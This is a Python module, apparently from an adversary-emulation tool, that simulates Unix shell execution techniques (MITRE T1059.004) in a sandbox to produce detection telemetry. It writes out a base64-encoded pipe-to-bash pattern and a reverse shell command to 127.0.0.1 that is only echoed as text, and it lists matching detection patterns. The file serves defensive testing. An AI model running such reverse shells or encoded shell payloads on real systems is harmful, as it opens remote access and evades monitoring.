"""
T1059.004 — Command and Scripting Interpreter: Unix Shell
Simulates adversarial shell execution patterns on macOS/Linux:
- Direct bash -c execution
- Heredoc-based script dropper
- Encoded command via echo | base64 | bash
- Reverse shell pattern (simulated — no actual connection)
"""

import base64
from techniques.base import AtomicBase, Telemetry


class T1059_004_BashExecution(AtomicBase):
    TECHNIQUE_ID = "T1059.004"
    TACTIC       = "execution"
    NAME         = "Command and Scripting Interpreter: Unix Shell"
    PLATFORMS    = ["macOS", "Linux"]
    SAFE         = True

    def execute(self) -> Telemetry:
        # ── 1. bash -c inline execution ────────────────────────────
        t = self._run_command([
            "bash", "-c",
            "echo '[phantomwatch] bash -c execution'; id; uname -s"
        ])

        self._add_ioc(t, "process", "bash")
        self._add_ioc(t, "pattern", "bash -c")

        # ── 2. Shell script dropper via heredoc ────────────────────
        script_path = self.sandbox / "dropped.sh"
        script_path.write_text(
            "#!/bin/bash\n"
            "echo '[phantomwatch] dropped shell script executing'\n"
            "echo 'hostname:' $(hostname)\n"
            "echo 'whoami:'   $(whoami)\n"
            "ls /tmp | head -5\n"
        )
        script_path.chmod(0o755)

        drop = self._run_command(["bash", str(script_path)])
        if drop.exit_code == 0:
            t.stdout   += f"\n--- dropped script ---\n{drop.stdout}"
            t.artifacts.append(str(script_path))

        self._add_ioc(t, "artifact", str(script_path))
        self._add_ioc(t, "pattern",  "chmod 755")

        # ── 3. Base64-encoded shell command (common evasion) ───────
        raw     = "echo '[phantomwatch] encoded shell payload'; whoami"
        encoded = base64.b64encode(raw.encode()).decode()

        enc_run = self._run_command([
            "bash", "-c",
            f"echo {encoded} | base64 --decode | bash"
        ])
        if enc_run.exit_code == 0:
            t.stdout += f"\n--- encoded payload ---\n{enc_run.stdout}"

        self._add_ioc(t, "pattern", "base64 --decode | bash")
        self._add_ioc(t, "pattern", "echo * | base64")

        # ── 4. Reverse shell pattern — simulated, no connection ────
        revshell_sim = self._run_command([
            "bash", "-c",
            "echo '[phantomwatch] reverse shell pattern: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 (simulated — not executed)'"
        ])
        if revshell_sim.exit_code == 0:
            t.stdout += f"\n--- reverse shell simulation ---\n{revshell_sim.stdout}"

        self._add_ioc(t, "pattern", "/dev/tcp/")
        self._add_ioc(t, "pattern", "bash -i")
        self._add_ioc(t, "pattern", "0>&1")

        return t

    def cleanup(self):
        for f in ["dropped.sh"]:
            p = self.sandbox / f
            if p.exists():
                p.unlink()
        self._wipe_sandbox()
